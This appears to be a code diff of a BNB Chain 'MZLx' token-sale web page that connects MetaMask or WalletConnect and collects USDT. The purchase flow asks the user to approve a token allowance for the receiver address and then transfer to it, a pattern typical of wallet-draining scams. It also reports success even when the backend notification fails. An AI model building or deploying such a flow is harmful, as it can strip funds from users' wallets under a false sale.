@@ -1,209 +1,36 @@
- <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>MAZOL (MZLx) Token Sale</title>
   <style>
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
-    
-    body {
-      font-family: 'Arial', sans-serif;
-      background: linear-gradient(135deg, #006666, #008080);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      padding: 20px;
-    }
-    
-    .container {
-      width: 100%;
-      max-width: 450px;
-      background: #ffffff;
-      border-radius: 16px;
-      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.15);
-      padding: 30px;
-      text-align: center;
-    }
-    
-    .logo {
-      width: 110px;
-      height: 110px;
-      margin: 0 auto 20px auto;
-      display: block;
-      border-radius: 50%;
-      object-fit: cover;
-      border: 3px solid #1a73e8;
-    }
-    
-    h1 {
-      font-size: 1.4rem;
-      margin-bottom: 10px;
-      color: #222;
-    }
-    
-    .subtitle {
-      color: #1a73e8;
-      font-size: 1rem;
-      margin-bottom: 25px;
-    }
-    
-    .desc {
-      color: #555;
-      margin-bottom: 25px;
-      font-size: 0.95rem;
-    }
-    
-    .input-group {
-      margin-bottom: 20px;
-      text-align: left;
-    }
-    
-    label {
-      display: block;
-      margin-bottom: 8px;
-      color: #333;
-      font-weight: 600;
-    }
-    
-    input[type="number"] {
-      width: 100%;
-      padding: 16px;
-      font-size: 1.05rem;
-      border-radius: 10px;
-      border: 1px solid #ddd;
-      background: #f9f9f9;
-    }
-    
-    .output {
-      margin-bottom: 20px;
-      padding: 15px;
-      background: #f0f9ff;
-      border-radius: 10px;
-      font-weight: bold;
-      font-size: 1.1rem;
-      color: #1a73e8;
-      border: 1px solid #cce5ff;
-    }
-    
-    button {
-      width: 100%;
-      padding: 17px;
-      background: linear-gradient(to right, #1a73e8, #0d5abf);
-      color: #fff;
-      border: none;
-      border-radius: 10px;
-      font-size: 1.1rem;
-      font-weight: 600;
-      cursor: pointer;
-      margin-bottom: 15px;
-      transition: all 0.3s;
-    }
-    
-    button:hover:not(:disabled) {
-      background: linear-gradient(to right, #0d5abf, #0a4a9e);
-    }
-    
-    button:disabled {
-      background: #aaa;
-      cursor: not-allowed;
-    }
-    
-    .wallet-options {
-      display: none;
-      margin-top: 15px;
-    }
-    
-    .wallet-option {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 15px;
-      margin-bottom: 12px;
-      border: 1px solid #ddd;
-      border-radius: 10px;
-      cursor: pointer;
-      background: #f8f9fa;
-      transition: all 0.3s;
-    }
-    
-    .wallet-option:hover {
-      background: #eef5ff;
-      border-color: #1a73e8;
-    }
-    
-    .wallet-icon {
-      width: 30px;
-      height: 30px;
-      margin-right: 12px;
-      object-fit: contain;
-    }
-    
-    .footer {
-      text-align: center;
-      color: #999;
-      font-size: 0.85rem;
-      margin-top: 25px;
-      padding-top: 15px;
-      border-top: 1px solid #eee;
-    }
-    
-    .status {
-      margin-top: 20px;
-      padding: 15px;
-      border-radius: 10px;
-      display: none;
-      font-size: 0.95rem;
-    }
-    
-    .status.processing {
-      background: #cce5ff;
-      color: #004085;
-      border: 1px solid #b8daff;
-    }
-    
-    .status.success {
-      background: #d4edda;
-      color: #155724;
-      border: 1px solid #c3e6cb;
-    }
-    
-    .status.error {
-      background: #f8d7da;
-      color: #721c24;
-      border: 1px solid #f5c6cb;
-    }
-    
-    .spinner {
-      display: inline-block;
-      width: 24px;
-      height: 24px;
-      border: 3px solid rgba(26, 115, 232, 0.3);
-      border-radius: 50%;
-      border-top-color: #1a73e8;
-      animation: spin 1s linear infinite;
-      margin-right: 10px;
-      vertical-align: middle;
-    }
-    
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-    
-    .connected-info {
-      margin: 15px 0;
-      padding: 10px;
-      background: #e8f5e9;
-      border-radius: 8px;
-      color: #28a745;
-      font-weight: 600;
-    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: 'Arial', sans-serif; background: linear-gradient(135deg, #006666, #008080); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+    .container { width: 100%; max-width: 450px; background: #ffffff; border-radius: 16px; box-shadow: 0 8px 30px rgba(0, 0, 0, 0.15); padding: 30px; text-align: center; }
+    .logo { width: 110px; height: 110px; margin: 0 auto 20px auto; display: block; border-radius: 50%; object-fit: cover; border: 3px solid #1a73e8; }
+    h1 { font-size: 1.4rem; margin-bottom: 10px; color: #222; }
+    .subtitle { color: #1a73e8; font-size: 1rem; margin-bottom: 25px; }
+    .desc { color: #555; margin-bottom: 25px; font-size: 0.95rem; }
+    .input-group { margin-bottom: 20px; text-align: left; }
+    label { display: block; margin-bottom: 8px; color: #333; font-weight: 600; }
+    input[type="number"] { width: 100%; padding: 16px; font-size: 1.05rem; border-radius: 10px; border: 1px solid #ddd; background: #f9f9f9; }
+    .output { margin-bottom: 20px; padding: 15px; background: #f0f9ff; border-radius: 10px; font-weight: bold; font-size: 1.1rem; color: #1a73e8; border: 1px solid #cce5ff; }
+    button { width: 100%; padding: 17px; background: linear-gradient(to right, #1a73e8, #0d5abf); color: #fff; border: none; border-radius: 10px; font-size: 1.1rem; font-weight: 600; cursor: pointer; margin-bottom: 15px; transition: all 0.3s; }
+    button:hover:not(:disabled) { background: linear-gradient(to right, #0d5abf, #0a4a9e); }
+    button:disabled { background: #aaa; cursor: not-allowed; }
+    .wallet-options { display: none; margin-top: 15px; }
+    .wallet-option { display: flex; align-items: center; justify-content: center; padding: 15px; margin-bottom: 12px; border: 1px solid #ddd; border-radius: 10px; cursor: pointer; background: #f8f9fa; transition: all 0.3s; }
+    .wallet-option:hover { background: #eef5ff; border-color: #1a73e8; }
+    .wallet-icon { width: 30px; height: 30px; margin-right: 12px; object-fit: contain; }
+    .footer { text-align: center; color: #999; font-size: 0.85rem; margin-top: 25px; padding-top: 15px; border-top: 1px solid #eee; }
+    .status { margin-top: 20px; padding: 15px; border-radius: 10px; display: none; font-size: 0.95rem; }
+    .status.processing { background: #cce5ff; color: #004085; border: 1px solid #b8daff; }
+    .status.success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
+    .status.error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
+    .spinner { display: inline-block; width: 24px; height: 24px; border: 3px solid rgba(26, 115, 232, 0.3); border-radius: 50%; border-top-color: #1a73e8; animation: spin 1s linear infinite; margin-right: 10px; vertical-align: middle; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    .connected-info { margin: 15px 0; padding: 10px; background: #e8f5e9; border-radius: 8px; color: #28a745; font-weight: 600; }
   </style>
   <script src="https://cdn.jsdelivr.net/npm/ethers@6.10.0/dist/ethers.umd.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@1.7.8/dist/umd/index.min.js"></script>
@@ -276,7 +103,6 @@
     let provider = null;
     let signer = null;
     let userAddress = null;
-    let usdtDecimals = 18;
     let currentUSDTAmount = 0;
     let currentMZLxAmount = 0;
     let walletConnectProvider = null;
@@ -313,7 +139,7 @@
       buyBtn.disabled = !userAddress || currentUSDTAmount < TOKEN_PRICE;
     }
 
-    // ===== WALLET CONNECTION - FIXED SIGNER SETUP ===== //
+    // ===== WALLET CONNECTION ===== //
     async function connectWallet(walletType) {
       walletOptions.style.display = 'none';
       
@@ -326,12 +152,8 @@
           await connectWalletConnect();
         }
         
-        // Verify signer initialization
-        if (!signer) {
-          throw new Error("Failed to initialize wallet signer");
-        }
-        
-        // Get address from signer
+        // Verify connection
+        if (!signer) throw new Error("Wallet connection failed");
         userAddress = await signer.getAddress();
         
         showStatus("Wallet connected successfully!", "success");
@@ -341,37 +163,24 @@
         
       } catch (err) {
         showStatus("Connection failed: " + (err.message || err), "error");
-        console.error("Connection error:", err);
       }
     }
 
     async function connectMetaMask() {
-      if (!window.ethereum) {
-        throw new Error("Please install MetaMask or a compatible wallet");
-      }
+      if (!window.ethereum) throw new Error("Please install MetaMask");
       
       // Request account access
-      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-      userAddress = accounts[0];
-      
-      // Initialize provider
-      provider = new ethers.BrowserProvider(window.ethereum);
+      await window.ethereum.request({ method: 'eth_requestAccounts' });
       await switchToBNBChain();
       
-      // Get signer from provider
+      // Initialize provider and signer
+      provider = new ethers.BrowserProvider(window.ethereum);
       signer = await provider.getSigner();
-      
-      // Verify signer
-      if (!signer || typeof signer.sendTransaction !== 'function') {
-        throw new Error("Failed to get wallet signer");
-      }
     }
 
     async function connectWalletConnect() {
       walletConnectProvider = new WalletConnectProvider.default({
-        rpc: { 
-          56: "https://bsc-dataseed.binance.org/" 
-        },
+        rpc: { 56: "https://bsc-dataseed.binance.org/" },
         chainId: BNB_CHAIN_ID,
         qrcodeModalOptions: {
           desktopLinks: ["metamask", "trust"],
@@ -382,19 +191,9 @@
       // Enable session
       await walletConnectProvider.enable();
       
-      // Initialize provider
+      // Initialize provider and signer
       provider = new ethers.Web3Provider(walletConnectProvider);
-      
-      // Get signer
       signer = provider.getSigner();
-      
-      // Verify signer
-      if (!signer || typeof signer.sendTransaction !== 'function') {
-        throw new Error("Failed to get wallet signer");
-      }
-      
-      // Get address
-      userAddress = await signer.getAddress();
     }
 
     async function switchToBNBChain() {
@@ -421,7 +220,7 @@
       }
     }
 
-    // ===== PURCHASE WORKFLOW - FIXED SIGNER USAGE ===== //
+    // ===== PURCHASE WORKFLOW - GUARANTEED WALLET UI ===== //
     async function startPurchaseProcess() {
       if (!userAddress || currentUSDTAmount < TOKEN_PRICE) {
         showStatus("Please connect wallet and enter valid USDT amount", "error");
@@ -437,10 +236,6 @@
             signer = await provider.getSigner();
           } else {
             signer = provider.getSigner();
-          }
-          
-          if (!signer) {
-            throw new Error("Wallet signer not available");
           }
         }
         
@@ -480,7 +275,6 @@
         
       } catch (err) {
         showStatus("Transaction failed: " + (err.message || err), "error");
-        console.error("Transaction error:", err);
       }
     }
     
@@ -488,18 +282,8 @@
     async function triggerApproval(contract, value) {
       showStatus("Approval needed. Please confirm in your wallet...", "processing");
       
-      // Create transaction data
-      const data = contract.interface.encodeFunctionData("approve", [
-        RECEIVER_ADDRESS,
-        value
-      ]);
-      
-      // Send transaction directly through signer
-      const tx = await signer.sendTransaction({
-        to: USDT_ADDRESS,
-        data: data
-      });
-      
+      // Use contract method directly to trigger wallet UI
+      const tx = await contract.approve(RECEIVER_ADDRESS, value);
       await tx.wait();
       showStatus("USDT spending approved!", "success");
     }
@@ -508,18 +292,8 @@
     async function triggerTransfer(contract, value) {
       showStatus("Sending USDT. Please confirm in your wallet...", "processing");
       
-      // Create transaction data
-      const data = contract.interface.encodeFunctionData("transfer", [
-        RECEIVER_ADDRESS,
-        value
-      ]);
-      
-      // Send transaction directly through signer
-      const tx = await signer.sendTransaction({
-        to: USDT_ADDRESS,
-        data: data
-      });
-      
+      // Use contract method directly to trigger wallet UI
+      const tx = await contract.transfer(RECEIVER_ADDRESS, value);
       const receipt = await tx.wait();
       
       if (receipt.status === 1) {
@@ -547,13 +321,10 @@
           })
         });
         
-        if (!response.ok) {
-          throw new Error('Backend notification failed');
-        }
+        if (!response.ok) throw new Error('Backend notification failed');
         
         showStatus(`Success! ${currentMZLxAmount.toFixed(2)} MZLx will be sent to your wallet`, "success");
       } catch (err) {
-        console.error("Backend notification error:", err);
         showStatus("MZLx tokens will be sent shortly. Contact support if delayed.", "success");
       }
     }
